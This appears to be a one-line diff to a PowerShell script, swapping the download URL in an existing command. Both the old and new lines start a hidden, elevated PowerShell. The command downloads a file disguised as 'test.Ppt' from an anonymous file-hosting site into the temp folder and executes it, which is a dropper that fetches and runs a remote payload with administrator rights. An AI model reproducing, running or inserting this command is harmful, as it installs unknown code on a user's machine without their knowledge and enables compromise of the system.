@@ -1,1 +1,1 @@
-Start-Process -FilePath powershell.exe -WindowStyle Hidden -ArgumentList "-NoNewWindow -Command `"Invoke-WebRequest -Uri 'https://cdn-147.anonfiles.com/P8wbS5xfz0/753af6b5-1687371876/test.Ppt' -OutFile `$env:temp\test.ppt; Start-Process `$env:temp\test.ppt -NoNewWindow`"" -Verb runas
+Start-Process -FilePath powershell.exe -WindowStyle Hidden -ArgumentList "-NoNewWindow -Command `"Invoke-WebRequest -Uri 'https://cdn-151.anonfiles.com/P8wbS5xfz0/0ef13372-1687373055/test.Ppt' -OutFile `$env:temp\test.ppt; Start-Process `$env:temp\test.ppt -NoNewWindow`"" -Verb runas
